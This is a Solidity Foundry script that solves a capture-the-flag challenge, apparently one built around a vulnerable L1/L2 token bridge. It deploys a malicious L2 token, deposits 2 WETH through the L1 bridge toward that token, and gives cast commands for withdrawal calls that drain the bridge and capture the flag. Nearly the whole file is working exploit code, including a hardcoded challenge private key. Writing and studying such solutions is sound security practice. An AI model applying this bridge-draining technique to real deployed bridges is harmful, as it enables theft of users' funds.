pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import "src/L2MaliciousToken.sol";
import "forge-std/console.sol";


interface IChallenge {
    function WETH() external view returns (address);
    function BRIDGE() external view returns (address);
}

interface WETH {
    function deposit() external payable;
    function approve(address, uint256) external;
}

interface L1Bridge {
    function depositERC20(address _l1Token, address _l2Token, uint256 _amount) external;
}

interface L2Bridge {
    function withdraw(address _l2Token, uint256 _amount) external;
}

contract ExploitL1 is Script {
    function setUp() public {}

    function run() public {
        // Fill these addresses from the challenge instance
        IChallenge challenge = IChallenge(0x56Fa2F4f56275473F8acf513721e3b2717dC2035);
        uint256 priv_key = 0xd66afa7021a387f7629292713d492a083cf8efebab8d00d8dc3ed373db0220af;

        // Hardcoded, see Lib_PredeployAddresses.sol
        L2Bridge l2Bridge = L2Bridge(0x420000000000000000000000000000000000baBe);

        // Get addresses
        vm.createSelectFork("l1");
        vm.startBroadcast(priv_key);
        WETH weth = WETH(challenge.WETH());
        L1Bridge l1Bridge = L1Bridge(challenge.BRIDGE());
        L2MaliciousToken malToken;

        // Deploy malicious token on L2
        vm.stopBroadcast();
        vm.createSelectFork("l2");
        vm.startBroadcast(priv_key);

        malToken = new L2MaliciousToken();
        malToken.setL1Weth(address(weth));

        console.log("L1 WETH: ", address(weth));
        console.log("L1 Bridge: ", address(l1Bridge));
        console.log("L2 Malicious Token: ", address(malToken));

        // Send 2 ether bridged over to the malicious token contract on L2
        vm.stopBroadcast();
        vm.createSelectFork("l1");
        vm.startBroadcast(priv_key);

        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), type(uint256).max);
        l1Bridge.depositERC20(address(weth), address(malToken), 2 ether);

        vm.stopBroadcast();

        // Now, just manually run the following, and then get the flag:
        //
        // $ cast send --rpc-url l2 --private-key $PRIV_KEY 0x420000000000000000000000000000000000baBe "withdraw(address,uint256)" $malToken 2000000000000000000
        //
        // $ cast send --rpc-url l2 --private-key $PRIV_KEY 0x420000000000000000000000000000000000baBe "withdraw(address,uint256)" 0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000 2000000000000000000
    }
}
